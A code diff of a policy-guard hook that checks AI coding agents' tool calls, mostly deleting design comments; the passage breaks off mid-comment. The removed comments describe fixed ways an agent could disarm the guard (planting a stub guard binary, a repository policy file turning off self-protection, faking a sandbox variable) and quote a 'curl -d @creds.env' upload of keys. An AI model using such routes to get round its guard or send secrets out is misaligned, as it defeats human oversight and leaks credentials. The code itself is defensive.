@@ -2,51 +2,10 @@
 // SPDX-License-Identifier: Apache-2.0
 // Copyright 2026 the SolonGate contributors
 
-/**
- * The policy guard (PreToolUse), the decision every tool call passes through.
- *
- * Installed globally (~/.claude/settings.json) it sees EVERY tool call from EVERY
- * session on the machine. Exit code 2 = BLOCK, exit code 0 = ALLOW.
- *
- * WHERE THE POLICY COMES FROM, in order:
- *
- *   1. ~/.solongate/policy.json, this machine's own file.
- *   2. policy.json beside the working directory, which may add RULES and nothing
- *      else: it lives in a repository the agent can write to, so `selfProtect`
- *      and `security` there are ignored, the thing being policed does not get
- *      to switch off the policing.
- *
- * There used to be a step above both: a service, when a credential named one,
- * cached for ten seconds and refreshed off the hot path. It is gone, and so is
- * everything that reached it. NEITHER FILE IS REQUIRED, with no policy at all
- * there is nothing to enforce and the call is allowed.
- *
- * The engine is the same whichever answered: hooks/policy-eval.mjs, a NIST
- * SP 800-207 PDP, fail-closed. Routing is binary. WHITE (allow) / BLACK
- * (block). Nothing is escalated to a model and there is no judge.
- *
- * Denials are recorded to disk, which is the only place they go. ALLOWs are
- * recorded by audit.mjs.
- *
- * There is a Go twin of all of this in packages/guard, deliberately identical,
- * because which of the two decides a call depends only on whether a machine has
- * the binary. A conformance suite used to run against both and was the only
- * thing that held them to each other. It has been removed. Keeping them
- * identical is now done by hand, in the same change, or not at all.
- *
- * Auto-installed by: `solongate repair`, from a checkout.
- */
 import { readFileSync, existsSync, statSync, readdirSync, writeFileSync, mkdirSync, chmodSync, renameSync, appendFileSync, rmSync, rmdirSync, openSync, readSync, closeSync, accessSync, constants } from 'node:fs';
 import { spawn, spawnSync } from 'node:child_process';
-// `normalize` is for the protected-path check and is NOT interchangeable with
-// `resolve`: the Go twin cleans a path with filepath.Clean, which does not make
-// it absolute. A JS side that resolved against cwd instead would refuse a
-// relative token the binary lets through, and two guards disagreeing about one
-// path is worse than both treating it the same way.
 import { resolve, join, dirname, isAbsolute, normalize } from 'node:path';
 import { homedir } from 'node:os';
-// The decision engine, shared with the MCP proxy so a policy cannot mean one
-// thing to a hook and another to the proxy. esbuild inlines this file.
 import {
   evaluate,
   extractCommands,
@@ -61,20 +20,6 @@ import {
   scanStrings,
 } from './policy-eval.mjs';
 
-// ── Per-project scratch, kept OUT of the project ─────────────────────────────
-// The guard and the audit hook pass a few small flags to each other (the eval
-// ring, the last-eval measurement, the deny flag, the tool-call marker). These
-// used to be written to `./.solongate/`, relative to whatever directory the
-// agent happened to run in, which scattered a dot-folder through every folder
-// an agent ever touched, config directories included, and put it inside repos
-// that had no ignore rule for it. It also read as "local logging is on" to
-// anyone who found one, which is a different setting entirely.
-//
-// They now live under the user's own ~/.solongate, in a directory named by a
-// hash of the project path, so the per-project separation the TUI relies
-// on survives while nothing is written where the user works. The hash is
-// duplicated in guard.mjs, audit.mjs and the TUI: all three must agree for
-// a call's flags to be found, so keep them identical if any one is touched.
 function projectKey(dir) {
   let h = 0x811c9dc5;
   const s = String(dir || '');
@@ -89,9 +34,6 @@ function projectFlagDir() {
   return join(resolve(homedir(), '.solongate'), 'projects', projectKey(resolve(process.cwd())));
 }
 
-// Remove the dot-folder older versions left in this working directory. Only our
-// own files go, and the directory only if that empties it, a folder someone
-// else put there, or one with anything unexpected in it, is left alone.
 let _legacySwept = false;
 function sweepLegacyFlagDir() {
   if (_legacySwept) return;
@@ -105,208 +47,28 @@ function sweepLegacyFlagDir() {
       if (ours.has(f)) { try { rmSync(join(dir, f), { force: true }); } catch { left.push(f); } }
       else left.push(f);
     }
-    if (left.length === 0) { try { rmdirSync(dir); } catch { /* not empty after all */ } }
-  } catch { /* never let cleanup disturb a tool call */ }
+    if (left.length === 0) { try { rmdirSync(dir); } catch {  } }
+  } catch {  }
 }
 
 import { createHash, randomBytes } from 'node:crypto';
 
 import { DLP_PATTERN_NAMES, dlpGlobToRe, dlpPatterns } from './dlp.mjs';
-// Bump on every change to this file. An installed hook is replaced by the
-// INSTALLER, which is the only thing that writes one now: this hook used to fetch
-// replacement hooks from a service and swap its own file, and there is no service
-// to serve them. The number is still how `doctor` and the Settings panel say an
-// installation is behind the package.
-// 108 makes the eval-ring record the same shape the Go guard writes. It had
-// four fields where that one has eleven, which nothing noticed while the only
-// reader wanted the timing, and then the first-run screen read it to show
-// somebody their first judged call and printed four dashes.
-//
-// 92 closes a disarm: this hook's own per-agent state, the policy cache above
-// all, was writable through a path-taking tool, because matchPathGlob does not
-// treat `*` as a wildcard after a `**`. See isProtectedPath.
-//
-// 91 collapsed a run of `*` in a glob before compiling it, and stat'd a file
-// before the egress scan read it. Both are resource fixes on agent-supplied
-// input: see dlpGlobToRe and DLP_MAX_FILE_BYTES.
-//
-// 99 RESTORES THE EGRESS CHECK, which had stopped running altogether. It lived
-// inside a fast path that first read a policy CACHE and gave up when there was
-// none, and nothing writes that cache any more -- so a `curl -d @creds.env
-// https://...` uploading a file full of keys was allowed, with dlpBlock configured
-// and working everywhere else. The Go guard blocked it, so the two disagreed about
-// a secret leaving the machine. 99 also stops this hook reading a credential at
-// all: two file reads leave the hot path of every tool call.
-//
-// 100 CLOSES A COMPLETE DISARM. ~/.solongate/bin/solongate-guard is the binary this
-// hook hands every call to once it prints the expected version, and writing that path
-// was not protected here -- so one tool call could plant a two-line stub that allows
-// everything, with `solongate doctor` still reporting a native guard in use. The Go
-// guard had covered it and the fix was never ported, so the machines at risk were
-// exactly the ones running THIS implementation. See TAMPER_PROTECTED_GLOBS.
-//
-// 101 is a SHAPE change rather than a behaviour one: the DLP pattern list moved out of
-// this file (and out of the post-tool hook and the shield) into ./dlp.mjs, so there is one
-// copy where there were three. Every compiled expression was proved identical before the
-// three were replaced -- the list had already drifted once, 70 against 14, and doing it
-// again while consolidating would have been the same bug self-inflicted.
-//
-// 109 CLOSES THE FIVE PLACES THE TWO IMPLEMENTATIONS DECIDED DIFFERENTLY. Three
-// layers the binary ran and this did not: the user's own protected paths
-// (userProtectedCheck), require-sandbox (sandboxRequired), and the detect-mode
-// DLP record on a client with no post-tool stage. The machine running THIS
-// implementation is the one with no binary, which is also the one where the OS
-// lock is weakest, unprivileged Linux falls back to `chmod 0444`, which stops a
-// write and does not stop `rm`, so the guard check was the only thing covering
-// the easy case and it was the half that was missing.
-//
-// Fourth, an ordering fix in this file: `policy.agents` scoping returned ALLOW
-// above the tamper check, so a policy naming other clients switched off
-// self-protection, egress, DLP and the rate limit for this one. Scoping now
-// decides whether the RULES apply, which is the only thing it was ever about.
-//
-// Fifth is on the Go side: it writes `.last-deny` now, so the audit hook's
-// duplicate suppression works there too.
-//
-// This number is how a machine compares the hook it has with the one in a
-// checkout, and a fix nobody picks up is not a fix.
-// 110 MAKES THE CLIENT CAPABILITY TABLE MATCH THE CLIENTS. Three of its cells
-// were wrong, and each was wrong in the direction of doing less:
-//
-//   opencode  redactsOutput was false under a comment saying the capability was
-//             untested. Measured against opencode 1.18.16: the result object is
-//             handed to `tool.execute.after` by reference and the same object is
-//             returned to the model, and Plugin.trigger awaits each hook without
-//             cloning. The plugin masks in place now, and awaits it.
-//   agy       reportsAfter was false under a comment saying it has no post-tool
-//             stage at all. It has one; the binary documents it. Detect mode and
-//             every ALLOW row were missing on this client because of that line.
-//   codex     redactsOutput stays false, now for the proven reason: its hook
-//             schema has no updatedToolOutput field at all.
-//
-// And reportsAfter did not exist on this side, which made the detect-mode record
-// added in 109 gate on the wrong capability, it keyed off redactsOutput, so on
-// Codex (post-tool stage, no output rewrite) this implementation wrote a record
-// the Go one skipped. The field is here now and both gate on it.
-// 111 MAKES require-sandbox FAIL CLOSED ON A KERNEL FACT. It refused on the
-// absence of SOLONGATE_SANDBOX, so an agent that exported the variable was
-// neither confined nor refused, one line in a shell profile and the switch
-// whose whole purpose is failing closed failed open. The marker now says which
-// confinement claims to be on and the kernel is asked whether it is: PID 1 in a
-// box, a protected path's readability under `run`. An answer that cannot be
-// reached is a refusal. Ported in the same change as the Go side, which is
-// where the probes are documented.
-// 112 LOCKS THE AUDIT LOG AGAINST ITS ONE UNSAFE OPERATION. Appends are atomic
-// against each other and always were; the TUI's delete and clear read the file,
-// decided, and wrote it back, so anything appended in between was gone. Both
-// sides take an O_EXCL lock file now, this one in the DETACHED writer, where it
-// costs the tool call nothing. Past a bounded wait the appender writes anyway
-// and the rewriter gives up, which is the right direction for each.
-// 113 DROPS THE NPM PLATFORM PACKAGE FROM sgGuardCandidates. This repository
-// does not publish one to a registry anymore (see build-go-binaries.mjs), so
-// the `require.resolve('@solongate/guard-${os}-${cpu}/package.json')` this used
-// to try first could never succeed — it was a node_modules walk on every tool
-// call in service of a package that does not exist anywhere it would be found.
-// The two real candidates, SOLONGATE_GUARD_BIN and ~/.solongate/bin, are what
-// is left. No decision logic changed; this bumps because every change to this
-// file does.
 const HOOK_VERSION = 113;
 
-// SG_DIR_MODE is the mode for ~/.solongate.
-//
-// Owner-only, because the directory holds the credential and the policy cache.
-// shared declares the same number on the Go side, and it has to be the same
-// number: several programs create this ONE directory, this hook, the audit hook,
-// the CLI, the guard binary, and mkdirSync and MkdirAll both apply a mode only
-// when they CREATE, so the first one to run on a machine decides it for all of
-// them. They disagreed, and this hook runs on every tool call, which made it the
-// one most likely to get there first.
-//
-// Declared up here, above every use, because some of the code below runs during
-// module initialisation, a `const` further down would be in its temporal dead
-// zone for those paths.
 const SG_DIR_MODE = 0o700;
 
-// SG_FILE_MODE is the mode for what this hook writes there.
-//
-// Owner-only for the same reason, and the local audit log is the sharpest case:
-// it records every command, path and URL the agent was told no about, which is a
-// log of what somebody was working on. It was being created 0644 inside a 0755
-// directory, so on a shared machine any other account could read it. Both sides
-// matter, a tight file inside a listable directory still leaks the filenames.
 const SG_FILE_MODE = 0o600;
 
-// ── The Go guard, when there is one and it is the right one ──────────────────
-//
-// Everything below this block is the Node decision engine. It stays, it stays
-// correct, and it stays the thing that runs whenever the fast path cannot be
-// trusted. THE RULE: a missing, stale, unreadable or crashing binary must mean
-// SLOW BUT GUARDED, never FAST BUT UNGUARDED. Every failure here falls through.
-//
-// Three things this gets right that a naive `exec the binary` would not:
-//
-// 1. STDIN IS READ HERE, ONCE, BEFORE THE BINARY RUNS. Handing the child fd 0
-//    directly would be faster to write and impossible to recover from: a binary
-//    that dies after consuming the payload leaves Node with nothing to fall back
-//    WITH, so it would evaluate an empty call and allow it. The payload is a few
-//    KB and the read is synchronous; the safety is worth more than the copy.
-//
-// 2. EXIT 2 IS AMBIGUOUS. It is this hook's block signal AND the code the Go
-//    runtime uses for an unhandled panic. A block always writes a decision to
-//    stdout first; a panic writes a stack trace to stderr and nothing to stdout.
-//    So exit 2 is honoured only with output to show for it, and a panic falls
-//    through to Node, which will reach its own verdict on the same payload.
-//
-// 3. THE VERSION MUST MATCH EXACTLY, not merely exist. This hook self-updates
-//    from the cloud on its own schedule while the binary only moves when npm
-//    moves it, so a machine can hold a hook from this week and a binary from
-//    last month. HOOK_VERSION bumps on every change to this file, and the binary
-//    prints the HOOK_VERSION it implements. Different numbers mean different
-//    decisions, and a binary that is merely OLD is not a smaller problem than
-//    one that is missing.
-//
-// SOLONGATE_NO_GO_GUARD=1 pins execution to Node. It exists so a failure can be
-// bisected without uninstalling anything.
 
-// The one read of fd 0 in this process. Everything downstream uses this string.
-//
-// It used to be conditional. `guard.mjs <client> --sg-refresh-policy` was a second
-// way to invoke this file, spawned detached by the installer, once per registered
-// client, to fetch the policy so the first real tool call was judged against
-// something instead of being waved through while the fetch ran. That invocation had
-// no tool call on stdin, and its stdin was a pipe nobody closed, so reading it would
-// have hung the hook forever; hence the branch. There is nothing to fetch and no
-// cache to warm, both installers stopped spawning it, and a file needs no warming.
 const SG_STDIN = (() => {
   try { return readFileSync(0, 'utf-8'); } catch { return ''; }
 })();
 
-// When this process began, as epoch milliseconds, the instant every reported
-// guard time is measured from.
-//
-// `performance.timeOrigin` is stamped before Node's bootstrap runs, so a
-// duration taken from it includes the interpreter coming up and this file being
-// parsed. That is not an accounting nicety: those two are the MAJORITY of what a
-// tool call pays for enforcement. Starting the clock further down (which is what
-// `Date.now()` at the top of the async body did) left them outside the window
-// and made the audit log report ~1ms for a call that really cost tens of them,
-// a number no process on a real machine can achieve, and one that quietly turned
-// the latency column into fiction.
-//
-// What is still NOT in it: the client's own fork/exec of node, which happens
-// before this process exists and which nothing running inside it can observe.
 const SG_ORIGIN_MS = (() => {
   try { return Math.round(performance.timeOrigin); } catch { return Date.now(); }
 })();
 
-// Where a binary may legitimately live, in the order they are trusted.
-//
-// The env override is first so a build can be pointed at without reinstalling.
-// ~/.solongate/bin is what every install has, project-local or global: the
-// hook is written to ~/.solongate/hooks as a lone file and launched from
-// arbitrary working directories, so this is resolved from the home directory
-// rather than through node_modules — there is no npm package this binary ever
-// ships inside of to resolve through.
 function sgGuardCandidates() {
   const out = [];
   if (process.env.SOLONGATE_GUARD_BIN) out.push(process.env.SOLONGATE_GUARD_BIN);
@@ -315,7 +77,6 @@ function sgGuardCandidates() {
   return out;
 }
 
-// Hand the whole call to the binary. Returns only when Node must decide instead.
 function sgTryGoGuard() {
   for (const bin of sgGuardCandidates()) {
     try {
@@ -323,8 +84,6 @@ function sgTryGoGuard() {
       if (process.platform !== 'win32') accessSync(bin, constants.X_OK);
     } catch { continue; }
 
-    // Ask what it is. Bounded, because this runs before anything has decided the
-    // binary can be trusted and it must not be able to hang what it speeds up.
     let version;
     try {
       const v = spawnSync(bin, ['--sg-version'], { encoding: 'utf-8', timeout: 2000 });
@@ -338,35 +97,21 @@ function sgTryGoGuard() {
       r = spawnSync(bin, process.argv.slice(2), {
         input: SG_STDIN,
         encoding: 'utf-8',
-        // The binary writes the eval record the audit hook reads back, so it is
-        // the one reporting this call's guard time, and from inside a process
-        // that was spawned partway through the work, it can only see its own
-        // share of it. Node's boot, this file's parse, the fd 0 read and the
-        // version probe above are all already spent by the time it starts.
-        // Handing it the origin is what lets the number it reports be the whole
-        // hook instead of the last two milliseconds of it.
         env: { ...process.env, SOLONGATE_HOOK_ORIGIN_MS: String(SG_ORIGIN_MS) },
-        // Well past every network call the guard makes. A binary still running
-        // at this point is not going to produce an answer worth waiting for.
         timeout: 10000,
       });
     } catch { return; }
 
-    // Killed, timed out, or never started: Node decides.
     if (!r || r.error || r.signal) return;
     const status = r.status;
     const stdout = r.stdout || '';
     if (status !== 0 && status !== 2) return;
-    // See (2) above: a block without a decision to show is a crash wearing a
-    // block's exit code.
     if (status === 2 && stdout.trim() === '') return;
 
     try {
       if (stdout) process.stdout.write(stdout);
       if (r.stderr) process.stderr.write(r.stderr);
     } catch {
-      // Writing the answer is the whole job. If it could not be delivered, Node
-      // has not written anything either, so it can still do the work.
       return;
     }
     process.exit(status);
@@ -374,45 +119,9 @@ function sgTryGoGuard() {
 }
 
 if (process.env.SOLONGATE_NO_GO_GUARD !== '1') {
-  // A throw anywhere in here is a bug in the fast path, and a bug in the fast
-  // path must not become an unguarded tool call.
   try { sgTryGoGuard(); } catch {}
 }
 
-// True when local log storage is ON. In that mode logs are kept LOCAL ONLY and
-// nothing is sent to the cloud audit log, local and cloud are one or the
-// other, never both.
-//
-// `undefined` is the ONLY value that means "we do not know yet". `null` is an
-// answer: it is what the refresh writes when the API returns no security block,
-// i.e. this project has no local-log config, i.e. cloud. Treating null as
-// unknown is what kept logs on the machine after local logging was switched
-// off, the answer fell through to the device-wide marker, and that marker is
-// shared by every agent on the box while the policy cache is per agent, so
-// whichever one refreshed last decided where everybody's logs went.
-// The policy a machine enforces when there is no service to ask.
-//
-// No credential is NOT an unconfigured machine. It is the ordinary deployment of
-// this program: the policy lives in a file, nothing is fetched, and nothing
-// leaves the device. So the file is a SOURCE here rather than a fallback for a
-// failed fetch, it used to be reachable only after a fetch had failed, which
-// meant a machine with no credential allowed every call while its policy sat on
-// disk unread.
-//
-// Two spellings are accepted. /policies/active answers with an envelope, and a
-// hand-written file is usually just the policy:
-//
-//   { "policy": {…}, "security": {…}, "selfProtect": true }   what the API sends
-//   { "mode": "denylist", "rules": [ … ] }                     the policy alone
-//
-// The envelope is what makes the rate limit, the egress rules and the DLP
-// scanner configurable with no service: they arrive in `security`, and a local
-// machine had no way to set them at all.
-//
-// Order: this machine's own ~/.solongate/policy.json first, then a per-project file
-// beside the working directory. Home first is deliberate, the project file
-// lives inside a repository the agent can write to, so it can only apply where
-// the person running this set nothing themselves.
 function loadLocalPolicyFile(cwd) {
   for (const p of [
     join(resolve(homedir(), '.solongate'), 'policy.json'),
@@ -422,18 +131,7 @@ function loadLocalPolicyFile(cwd) {
     try {
       const obj = JSON.parse(readFileSync(p, 'utf-8'));
       if (!obj || typeof obj !== 'object') continue;
-      // Only THIS MACHINE's own file is trusted with more than rules. The
-      // project file sits in a repository the agent can write to: letting it
-      // carry selfProtect would be a one-line disarm of the tamper guard, and
-      // letting it carry `security` would switch off the DLP scanner from inside
-      // the checkout. It may add rules, and nothing else.
       const own = !cwd || p !== resolve(cwd, 'policy.json');
-      // A policy DOCUMENT may carry `security` inside it. That is how the
-      // service stores it (SecurityLayersIn reads exactly that), so it is the
-      // shape a policy exported from one arrives in, and reading the envelope
-      // only would have made a hand-copied policy's DLP config a silent no-op.
-      // The envelope wins when both are present: it is the outer, more specific
-      // statement.
       const inner = own && obj.policy && typeof obj.policy === 'object' ? obj.policy.security : undefined;
       if (obj.policy && typeof obj.policy === 'object') {
         return {
@@ -449,91 +147,49 @@ function loadLocalPolicyFile(cwd) {
         selfProtect: undefined,
         path: p,
       };
-    } catch { /* an unreadable file is not a reason to stop looking at the next */ }
+    } catch {  }
   }
   return null;
 }
 
-// Resolve the FOLDER local logs may be written into. It MUST be absolute on
-// THIS machine. A relative path, e.g. a Windows "C:/Users/…" path evaluated on
-// Linux, where Node treats it as relative, would be created under the agent's
-// current working directory and pollute whatever project it happens to run in
-// (that's how stray "…/C:/Users/HP/solongate-logs" folders appear inside repos).
-// When the configured path isn't absolute here, fall back to a fixed home folder
-// so entries are never lost and never leak into a project, and record the bad
-// path so the dashboard/user can be told their path isn't valid on this device.
 let _invalidPathNoted = false;
 function resolveLocalLogDir(rawPath) {
   const dir = String(rawPath || '').trim().replace(/[\\/]+$/, '');
   if (!dir) return null;
   if (isAbsolute(dir)) return dir;
   const fallback = resolve(homedir(), '.solongate', 'local-logs');
-  // Non-absolute path (e.g. a Windows path on Linux): fall back. The diagnostic
-  // marker is written at most ONCE per process, NOT on every denial, a per-call
-  // writeFileSync here widened the window where a concurrent guard process dies
-  // before its audit append lands (dropped denials under a simultaneous burst).
   if (!_invalidPathNoted) {
     _invalidPathNoted = true;
     try {
       mkdirSync(resolve(homedir(), '.solongate'), { recursive: true, mode: SG_DIR_MODE });
       writeFileSync(resolve(homedir(), '.solongate', '.local-logs-invalid-path'),
         JSON.stringify({ configured: dir, fallback, ts: Date.now() }));
-    } catch { /* ignore */ }
+    } catch {  }
   }
   return fallback;
 }
 
-// Local log storage (opt-in): write solongate-audit.jsonl inside the user's
-// chosen FOLDER. The audit hook does the ALLOW path; the guard does DENY (a
-// blocked call never reaches PostToolUse). `security` is the resolved config.
-// accountMark lived here: a 16-character hash prefix of the key, stamped onto every
-// local log line as `acct`. The machine-local log is one file, and after pairing a
-// different account the viewers presented the previous one's calls as yours, so a
-// reader could keep its own lines without deleting anybody's history.
-//
-// There is one account's worth of calls on a machine now, and it is not an account:
-// nothing pairs, nothing reads `acct`, and the only thing left that wanted a
-// credential was this. Its removal is what lets the guard stop reading a credential
-// file on the hot path of every tool call.
 
 function writeLocalLog(security, entry) {
   try {
     const l = security && security.localLogs;
-    // No usable folder in the resolved config. The answer can still be "local is
-    // on" from the persisted marker alone, i.e. WITHOUT a resolved config (empty
-    // or cold policy cache, or a refresh that failed while the key was being
-    // rotated), in which case keep the copy in the per-device default folder
-    // rather than dropping it.
     if (!l || typeof l.path !== 'string' || !l.path.trim()) {
-      // No folder named, so the per-device default. RECORDING IS NOT OPTIONAL:
-      // this used to return early when the configuration said local logging was
-      // off, which made sense while there was a service to POST to instead. With
-      // that gone, returning here loses the record entirely, the only thing the
-      // setting can still choose is WHERE.
       const fallbackDir = resolve(homedir(), '.solongate', 'local-logs');
       const fallbackLine = JSON.stringify(entry) + '\n';
       const fallbackPayload = Buffer.from(JSON.stringify({ dir: fallbackDir, line: fallbackLine }), 'utf-8').toString('base64');
       spawn(process.execPath, [process.argv[1], '--sg-log-write', fallbackPayload], { detached: true, stdio: 'ignore' }).unref();
       return;
     }
-    // Resolve the dir with ZERO filesystem work (no mkdir, no marker write) so the
-    // detached spawn below is the FIRST syscall. Traced root cause: the earliest
-    // guard processes in a burst do extra startup work (policy refresh + WASM),
-    // exceed Claude Code's hook timeout, and get SIGKILLed partway THROUGH
-    // writeLocalLog, before any append. So we hand the write to a DETACHED child
-    // (own process group, survives the kill) IMMEDIATELY, as the very first action,
-    // and do it EVERY time (no inline append → no partial-write / duplicate risk).
     let dir = String(l.path).trim().replace(/[\\/]+$/, '');
     if (!dir) return;
     if (!isAbsolute(dir)) dir = resolve(homedir(), '.solongate', 'local-logs');
     const line = JSON.stringify(entry) + '\n';
     const payload = Buffer.from(JSON.stringify({ dir, line }), 'utf-8').toString('base64');
     spawn(process.execPath, [process.argv[1], '--sg-log-write', payload], { detached: true, stdio: 'ignore' }).unref();
-  } catch { /* best-effort */ }
+  } catch {  }
 }
 
-// Safe file read with size limit (1MB max) to prevent DoS via large files
-const MAX_FILE_READ = 1024 * 1024; // 1MB
+const MAX_FILE_READ = 1024 * 1024;
 function safeReadFileSync(filePath, encoding = 'utf-8') {
   try {
     const stat = statSync(filePath);
@@ -542,39 +198,7 @@ function safeReadFileSync(filePath, encoding = 'utf-8') {
   } catch { return ''; }
 }
 
-// NO CREDENTIAL IS READ HERE ANY MORE, and two file reads leave the hot path of
-// every tool call with it.
-//
-// What stood here was the resolution of an API key, from three places in a
-// deliberate order, the environment, then ~/.solongate/cloud-guard.json (written by
-// the installer, absolute because a global hook runs from an arbitrary cwd), then a
-// project-local .env. The order mattered: .env used to win, and a forgotten key in
-// the folder an agent happened to start in would shadow the paired one, so every
-// call from that directory logged nothing while the same agent one folder over
-// logged fine, no symptom, because enforcement never needed the network. A format
-// filter sat on top of it, so a sample placeholder could not shadow a working value
-// and fail every call closed.
-//
-// All of it existed to answer requests that are gone. The last thing holding on was
-// accountMark, which hashed the key into a `acct` stamp on each local log line so a
-// machine paired to two accounts could tell whose calls were whose. There are no
-// accounts, and nothing read the stamp.
-//
-// The cost was not only the code: loadEnvKey and loadGlobalCloudConfig ran a stat
-// and a read each, on every tool call, before a single rule was evaluated.
 
-/**
- * Which clients the guard is REGISTERED for on this machine.
- *
- * The dashboard used to infer this from "whose guard has called in", which
- * answers a different question than `repair` and `doctor` do, a client that is
- * installed but has not been opened in days reads as unguarded, and the three
- * surfaces contradicted each other while using identical wording. The machine
- * is the only thing that can see its own files, so it reports them.
- *
- * Cheap on purpose: four existence/substring checks against files this hook
- * already treats as tamper targets, run on a poll that is throttled to 10s.
- */
 function registeredClients() {
   const home = resolve(homedir());
   const has = (p, needle) => {
@@ -593,64 +217,17 @@ function registeredClients() {
   return out;
 }
 
-// Two distinct identities, deliberately kept separate:
-//
-//   AGENT_TYPE, the real AI client running this hook (claude-code / codex /
-//   antigravity / openclaw). Baked into the hook registration by the installer
-//   as argv[2] (e.g. `node guard.mjs claude-code`). Decides the response
-//   format AND whether a selected policy actually applies to this client.
-//   claude-code and codex share ONE response contract (see blockTool); only
-//   antigravity differs.
-//
-//   POLICY_SELECTOR, set per-terminal via SOLONGATE_AGENT_ID (a policy id
-//   from the dashboard "Use in terminal" button, or an agent name). Decides
-//   WHICH policy to load. When unset, no policy is enforced, a plain launch
-//   is intentionally unrestricted.
 const AGENT_TYPE = process.argv[2] || 'claude-code';
 const POLICY_SELECTOR = process.env.SOLONGATE_AGENT_ID || '';
 const AGENT_ID = POLICY_SELECTOR || AGENT_TYPE;
 const AGENT_NAME = process.env.SOLONGATE_AGENT_NAME || process.argv[3] || AGENT_TYPE;
 
-// ── Background policy refresh (stale-while-revalidate) ──
-// The hot path NEVER blocks on the network: when the policy cache is stale it
-// serves the cached (or local) policy INSTANTLY and spawns this detached mode to
-// fetch a fresh policy and rewrite the cache for the NEXT call. Result: fast tool
-// calls AND ~one-call propagation of policy changes, no long-TTL tradeoff.
-// Survivable local-log writer. A denial's audit line is written by a DETACHED
-// child (this same file, invoked with --sg-log-write <base64>) so the entry
-// lands even if Claude Code kills the parent hook mid-write during a concurrent
-// denial burst. Handled FIRST and exits immediately, the child never loads the
-// heavy guard logic below.
-// ── the audit log's lock ─────────────────────────────────────────────────────
-//
-// THE APPEND IS NOT THE RACE. O_APPEND writes are atomic against each other, so
-// a burst of concurrent hooks never corrupts the log and needs no lock. The one
-// unsafe operation is the TUI's delete and clear: read the whole file, decide
-// what it should say, write it back. Anything appended in between is in neither
-// version and is gone, silently, which for an audit trail is the part that
-// matters.
-//
-// IT IS AFFORDABLE HERE AND WOULD NOT BE ON THE HOT PATH. This runs in the
-// DETACHED child, spawned and abandoned by a hook that has already handed its
-// verdict to the agent. A lock in here costs the tool call nothing.
-//
-// The rules are shared.AuditLockName's, and both implementations follow the
-// same ones or the lock is decoration: an O_EXCL create is the lock, a lock
-// older than the stale window is broken and taken, and waiting is bounded.
-//
-// PAST THE BOUND IT WRITES ANYWAY, which is the opposite of what the rewriter
-// does and is deliberate in both directions: losing the lock race must not lose
-// the record, while a delete that did not happen is visible to the person who
-// pressed the key and a vanished record is not.
 const SG_LOCK_NAME = '.solongate-audit.lock';
 const SG_LOCK_STALE_MS = 5000;
 const SG_LOCK_WAIT_MS = 2000;
 
-// A synchronous pause, because this writer has no event loop to wait on and
-// must not return before the line is on disk. Atomics.wait on a throwaway
-// buffer is the one sleep Node offers that blocks the thread.
 function sgSleep(ms) {
-  try { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms); } catch { /* spin instead */ }
+  try { Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms); } catch {  }
 }
 
 function sgLockLog(dir) {
@@ -658,21 +235,17 @@ function sgLockLog(dir) {
   const until = Date.now() + SG_LOCK_WAIT_MS;
   for (;;) {
     try {
-      // 'wx' is O_CREAT|O_EXCL|O_WRONLY: atomic on every filesystem this runs
-      // on, so holding it is holding the only successful create.
       closeSync(openSync(lock, 'wx', SG_FILE_MODE));
       return () => { try { rmSync(lock, { force: true }); } catch {} };
     } catch {
       try {
         const st = statSync(lock);
         if (Date.now() - st.mtimeMs > SG_LOCK_STALE_MS) {
-          // A writer killed between creating and removing it would otherwise
-          // stop every later write for the rest of the session.
           try { rmSync(lock, { force: true }); } catch {}
           continue;
         }
-      } catch { /* vanished between the create and the stat; try again */ }
-      if (Date.now() >= until) return null; // write anyway, see above
+      } catch {  }
+      if (Date.now() >= until) return null;
       sgSleep(10);
     }
   }
@@ -684,17 +257,7 @@ function sgLockLog(dir) {
     try {
       const _pl = JSON.parse(Buffer.from(process.argv[_wi + 1] || '', 'base64').toString('utf-8'));
       if (_pl && _pl.dir && _pl.line) {
-        // The folder is a PROJECT setting, so it reaches every device, and a
-        // path that exists on one ("/home/me/") is unwritable on another (macOS
-        // has no /home). When that happens the append used to fail silently, and
-        // because local-only mode also skips the cloud POST, the entry was lost
-        // entirely: "no logs on the Mac". Fall back to the per-device default
-        // folder, which always exists, and leave a marker naming the bad path.
         let _dir = _pl.dir;
-        // The mode on appendFileSync applies only when it CREATES the file, so a
-        // log this hook already wrote 0644 would keep it forever. Narrowed
-        // afterwards as well. This runs in the DETACHED writer, never on the hot
-        // path, so the extra syscall costs the tool call nothing.
         const _narrow = (f) => { try { chmodSync(f, SG_FILE_MODE); } catch {} };
         try {
           mkdirSync(_dir, { recursive: true, mode: SG_DIR_MODE });
@@ -730,82 +293,16 @@ function sgLockLog(dir) {
   }
 }
 
-// ── Per-tool block/allow output ──
-// Response format depends on the agent:
-// Claude Code:      exit 2 + stderr = BLOCK, exit 0 = ALLOW
-// Codex CLI:        IDENTICAL to Claude Code, verified against the Codex source
-//   (codex-rs/hooks): exit 2 with a non-empty stderr blocks the tool with that
-//   text as the reason; exit 0 with EMPTY stdout allows; exit 0 with
-//   {"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":
-//   "deny","permissionDecisionReason":"…"}} also blocks. Two things are NOT
-//   interchangeable with Claude and are load-bearing here: the output struct is
-//   deny_unknown_fields (any extra key makes Codex discard the whole decision),
-//   and permissionDecision "allow" is only legal TOGETHER WITH updatedInput,
-//   a bare allow is rejected as unsupported. Hence allowTool() stays silent.
-// Antigravity CLI:  its PreToolUse hook result is a protobuf message decoded from
-//   stdout JSON: BLOCK = {"allow_tool": false, "deny_reason": "..."}, ALLOW =
-//   {"allow_tool": true} (exit 0). NOTE: {"decision":"deny"} is Antigravity's
-//   *Stop* hook schema, NOT the tool gate, agy silently runs the tool if we
-//   send that, so the field names here are load-bearing (verified in the agy
-//   1.1.5 binary: AllowTool bool / DenyReason string).
 
-// Terminate the hook WITHOUT forcing process.exit().
-//
-// The reason was a fetch: on Windows + Node 24, process.exit() right after one, the
-// audit POST, aborted with `Assertion failed: !(handle->flags & UV_HANDLE_CLOSING),
-// file src\win\async.c`, because the fetch's DNS and socket teardown was still
-// settling in libuv's threadpool and exit() double-closed the loop's async handle.
-// The abort REPLACED exit code 2, so Claude Code saw a non-blocking hook failure and
-// ran the tool anyway: the guard computed DENY and never blocked.
-//
-// There is no fetch left in this hook. The drain stays anyway, and not out of
-// caution: setting process.exitCode and letting the loop end on its own is what makes
-// the LATCH possible, and the latch is doing the real work here. It preserves the
-// FIRST code, so a later allowTool() reached on a fall-through path cannot overwrite a
